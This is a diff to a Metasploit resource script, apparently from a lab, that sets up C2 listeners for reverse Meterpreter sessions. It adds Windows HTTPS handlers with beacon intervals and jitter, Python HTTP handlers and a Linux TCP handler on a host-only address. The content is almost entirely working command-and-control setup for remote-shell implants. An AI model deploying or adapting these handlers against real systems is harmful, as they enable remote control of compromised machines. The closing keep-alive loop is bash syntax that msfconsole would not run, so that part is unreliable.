@@ -5,7 +5,9 @@
 spool /home/kali/Desktop/c2/session_logs.txt
 setg ExitOnSession false
 
-# 2. Handler for 10s Beacon (Port 4444)
+# --- WINDOWS HTTPS HANDLERS (4444-4446) ---
+
+# Handler for 10s Windows (Port 4444)
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
 set LHOST 192.168.56.10
@@ -14,7 +16,7 @@ set HttpWait 10
 set HttpJitter 10
 exploit -j
 
-# 3. Handler for 30s Beacon (Port 4445)
+# Handler for 30s Windows (Port 4445)
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
 set LHOST 192.168.56.10
@@ -23,7 +25,7 @@ set HttpWait 30
 set HttpJitter 10
 exploit -j
 
-# 4. Handler for 60s Beacon (Port 4446)
+# Handler for 60s Windows (Port 4446)
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_https
 set LHOST 192.168.56.10
@@ -32,11 +34,40 @@ set HttpWait 60
 set HttpJitter 10
 exploit -j
 
-# 5. Handler for Legacy Linux TCP (Port 4447)
+# --- PYTHON HTTP HANDLERS (8444-8446) ---
+
+# Handler for 10s Python (Port 8444)
+use exploit/multi/handler
+set payload python/meterpreter/reverse_http
+set LHOST 192.168.56.10
+set LPORT 8444
+set HttpWait 10
+exploit -j
+
+# Handler for 30s Python (Port 8445)
+use exploit/multi/handler
+set payload python/meterpreter/reverse_http
+set LHOST 192.168.56.10
+set LPORT 8445
+set HttpWait 30
+exploit -j
+
+# Handler for 60s Python (Port 8446)
+use exploit/multi/handler
+set payload python/meterpreter/reverse_http
+set LHOST 192.168.56.10
+set LPORT 8446
+set HttpWait 60
+exploit -j
+
+# --- LEGACY TCP HANDLER ---
 use exploit/multi/handler
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 192.168.56.10
 set LPORT 4447
 exploit -j
 
+# 6. Keep Handlers Alive
+echo "[*] Handlers are running. Keeping console alive..."
 sessions -l
+while true; do sleep 60; done
